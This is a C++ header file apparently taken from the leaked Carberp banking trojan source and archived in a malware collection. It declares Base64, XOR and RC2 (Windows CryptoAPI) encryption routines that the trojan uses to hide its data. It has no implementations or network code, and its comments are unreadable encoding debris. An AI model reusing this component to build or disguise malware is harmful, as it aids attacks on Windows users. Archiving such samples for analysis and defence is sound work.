/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#ifndef CryptH
#define CryptH

//-----------------------------------------------------------------------------
#include <windows.h>
#include <wincrypt.h>

#include "Strings.h"


PCHAR WINAPI Decrypt(PCHAR String, PCHAR OutString = NULL);


//****************************************************************************
//  BASE64 - ������ �����������/������������� BASE64
//****************************************************************************

namespace BASE64
{
	// ����������� ������ � ������ ������� BASE64
	PCHAR Encode(LPBYTE Buf, DWORD BufSize);

	// ��c��������� ������ �� ������� BASE64
	// ������ ��������� ������ ����� ������ �������� STR::Length,
	// ���� �������� ��������� �� ����������, ���� ��� ���������
	// ��������� ���������� �������� STR::Free()
	PCHAR Decode(PCHAR Buf, DWORD *ResultSize = NULL);
}



// ����� �����������
typedef bool (*TCryptMethod)(LPVOID Key, LPBYTE Buffer, DWORD BufferSize, PDWORD ResultBufferSize);


//****************************************************************************
//  ������ ��� ���������� XOR ����������
//****************************************************************************

namespace XORCrypt
{
	// ���������� XOR ����������
	DWORD Crypt(PCHAR Password, LPBYTE Buffer, DWORD Size);

	// ��� ������������ TCryptMethod
	bool Crypt(LPVOID Password, LPBYTE Buffer, DWORD Size, PDWORD OutSize);


	//----------------------------------------------------------------
	//   DecodeBuffer - ������� ���������� ����� ���������� � ����
	//                   ������
	//   ������ ������
	//   [���������](DWORD ������ ������)(������)(������)
	//
	//
	//  Signature - ��������� ������. NULL ���� �����������
	//
	//  Buffer - ����� ������������� ������
	//
	//   Size - ������ ������. ����� ������ ������� ����� ���������
	//			������ �������������� ������
	//
	//  ��������� - ������� ���������� ��������� �� ������ ������
	//              ��������������� ������.
	//  ������ ��� ��������� �� ����������!
	//----------------------------------------------------------------
	LPBYTE DecodeBuffer(PCHAR Signature, LPVOID Buffer, DWORD &Size);


}


//****************************************************************************
//  ������ ��� ���������� �������� WIN Crypt
//  ����� ������ �� ���������� ��������� (� - ����):
//
//  (4� ������� �������� IV)(BASE64 ������)(4� ������ �������� IV)(��������� BASE64 ==)
//
//****************************************************************************

namespace RC2Crypt
{
	// ������� ��������� ������ ������������� ����� �� ������
	PCHAR ExtractIV(PCHAR Buf, DWORD StrLen);

	// ������������ ��������� ������
	PCHAR GenerateIV();

	// ���������� �����
    PCHAR Encode(LPBYTE Buf, DWORD BufSize,  PCHAR Password);

	// ������������ �����
	// �� ����� ������ BASE64 �������� � ������ � ��� �������� IV
	// BufSize - ������ ������������� ������.
	// ���� �������� ������� ��������, �� ������ ������
	// ����� ��������� �� �������� �������.
	// ����� ��������� ������ BufSize ����� ��������� �� ������
	// ��������������� ������
	bool Decode(PCHAR Password, PCHAR Buf, DWORD &BufSize);

	// ������� ���������� ������ � ��������� � ������
    bool DecodeStr(PCHAR Password, PCHAR Str);

	// ��������� ����� ��������� Win Crypto API
    // ������� �������� ����������� ����� ������ ������� MemAlloc()
	LPBYTE WinEncode(LPBYTE Buf, DWORD &BufSize, PCHAR Password, PCHAR IV);

	// ������������ ����� ��������� Win Crypto API
	PCHAR WinDecode(PCHAR Buf, DWORD &BufSize, PCHAR Password, PCHAR IV);

	// ������������ ���� ����������� �� ������ ������ � ������� ������������� IV
	bool GenerateKey(PCHAR Password, PCHAR IV, HCRYPTPROV &Provider, HCRYPTKEY &Key);
}


//-----------------------------------------------------------------------------
#endif